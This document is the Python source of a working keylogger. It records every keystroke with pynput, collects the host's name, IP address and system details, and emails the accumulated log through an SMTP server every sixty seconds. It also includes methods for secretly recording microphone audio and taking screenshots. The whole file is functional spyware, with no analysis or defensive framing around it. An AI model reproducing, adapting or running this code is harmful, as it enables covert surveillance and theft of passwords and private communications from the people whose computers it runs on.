import logging
import os
import platform
import smtplib
import socket
import threading
import wave
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard
from pynput.keyboard import Listener
import sounddevice as sd
import pyscreenshot
import json


def load_config(config_file="config.json"):
    try:
        with open(config_file, "r") as file:
            config = json.load(file)
        return config
    except Exception as e:
        print(f"Error reading config file: {e}")
        return {}

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log += string

    def save_key_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " [SPACE] "
            elif key == keyboard.Key.esc:
                current_key = " [ESC] "
            else:
                current_key = f" [{str(key)}] "
        self.append_log(current_key)

    def send_mail(self, message):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = "Keylogger Report"
            msg.attach(MIMEText(message, 'plain'))

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, msg.as_string())
        except Exception as e:
            print(f"Error sending email: {e}")

    def report(self):
        if self.log.strip():
            self.send_mail(self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def capture_system_info(self):
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            system_info = (
                f"Hostname: {hostname}\n"
                f"IP Address: {ip_address}\n"
                f"Processor: {platform.processor()}\n"
                f"System: {platform.system()} {platform.release()}\n"
                f"Machine: {platform.machine()}\n"
            )
            self.append_log(system_info)
        except Exception as e:
            self.append_log(f"Error capturing system info: {e}\n")

    def record_audio(self, duration=10, filename="sound.wav"):
        try:
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            with wave.open(filename, 'wb') as audio_file:
                audio_file.setnchannels(2)
                audio_file.setsampwidth(2)
                audio_file.setframerate(fs)
                audio_file.writeframes(recording.tobytes())
            self.append_log(f"Audio recorded to {filename}\n")
        except Exception as e:
            self.append_log(f"Error recording audio: {e}\n")

    def capture_screenshot(self, filename="screenshot.png"):
        try:
            img = pyscreenshot.grab()
            img.save(filename)
            self.append_log(f"Screenshot saved as {filename}\n")
        except Exception as e:
            self.append_log(f"Error capturing screenshot: {e}\n")

    def run(self):
        self.capture_system_info()
        threading.Thread(target=self.report, daemon=True).start()
        with Listener(on_press=self.save_key_data) as listener:
            listener.join()



config = load_config()
EMAIL_ADDRESS = config.get("EMAIL_ADDRESS")
EMAIL_PASSWORD = config.get("EMAIL_PASSWORD")
SEND_REPORT_EVERY = 60

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    try:
        keylogger.run()
    except KeyboardInterrupt:
        print("Keylogger stopped.")
    except Exception as e:
        print(f"Error: {e}")
